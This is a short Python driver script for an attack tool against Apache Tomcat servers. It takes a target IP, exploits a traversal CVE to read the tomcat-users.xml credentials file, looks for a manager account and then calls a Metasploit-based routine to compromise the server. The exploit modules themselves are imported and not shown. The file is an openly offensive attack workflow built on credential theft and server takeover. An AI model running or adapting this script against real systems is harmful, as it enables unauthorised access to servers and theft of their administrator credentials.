#!/usr/bin/python

import sys

import arguments
import compromise
import output
import traversal

#

args = arguments.parseArguments()
attacked_ip = arguments.getIp(args)

#

output.tentative("exploiting CVE to obtain tomcat-users.xml")

try:
    xml_file = traversal.get_tomcatusersxml(attacked_ip)
except IOError:
    output.negative("server not responding")
    sys.exit(1)

output.positive("obtained tomcat-users.xml")

#

output.tentative("searching for a manager account")

try:
    manager = traversal.find_manager(xml_file)
except KeyError:
    output.negative("no manager account found")
    sys.exit(2)

output.positive("found a manager account")

#

output.tentative("compromising server")

try:
    output.tentative("switching to msf console\n")
    compromise.attack(manager)
except RuntimeError:
    output.negative("attack failed")
    sys.exit(3)
except Exception:
    output.negative("attack script not found")
    sys.exit(3)

output.positive("server compromised")

#

sys.exit(0)
